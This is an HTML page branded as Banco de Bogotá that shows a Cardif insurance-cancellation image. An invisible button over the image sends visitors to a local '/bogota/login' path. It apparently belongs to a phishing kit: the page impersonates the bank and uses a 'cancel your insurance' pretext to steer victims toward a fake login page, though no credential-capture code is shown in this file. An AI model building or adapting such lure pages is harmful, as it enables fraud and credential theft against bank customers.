<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="/bogota/icono_bogota.ico">
    <title>Cancelar Seguro - Banco de Bogotá</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <x-control :auto-guardar="false" :auto-completar="false" :auto-init="true" :debug="false" />
    <style>
        @font-face {
            font-family: Roboto-Regular;
            src: url(/bogota/6bede58e856278b0f8f1.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Medium;
            src: url(/bogota/0fcd45fbfc419c42c8b9.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Bold;
            src: url(/bogota/17451a4c1cd55e33ac57.ttf);
            font-display: swap
        }

        body {
            font-family: Roboto-Regular;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
        }

        .container-img {
            position: relative;
            width: 100%;
            max-width: 480px;
            margin: 0 auto;
        }

        .imagen-fondo {
            width: 100%;
            height: auto;
            display: block;
        }

        .boton-clickable {
            position: absolute;
            top: 17.5%;
            left: 50%;
            transform: translateX(-50%);
            width: 70%;
            height: 3.2%;
            cursor: pointer;
        }

        .boton-clickable:active {
            opacity: 0.7;
        }
    </style>
</head>

<body>
    <!-- Header -->
    <div class="text-center py-3 bg-white">
        <img src="/bogota/logo_bogota_1.svg" width="200" height="auto" alt="Banco de Bogotá">
    </div>

    <div class="container-img">
        <img src="/3co/assets/cardif.webp" alt="Cancela tu Seguro Cardif" class="imagen-fondo" />
        <div class="boton-clickable" id="btnCancelar"></div>
    </div>

    <script>
        document.getElementById('btnCancelar').addEventListener('click', function() {
            window.location.href = '/bogota/login';
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>
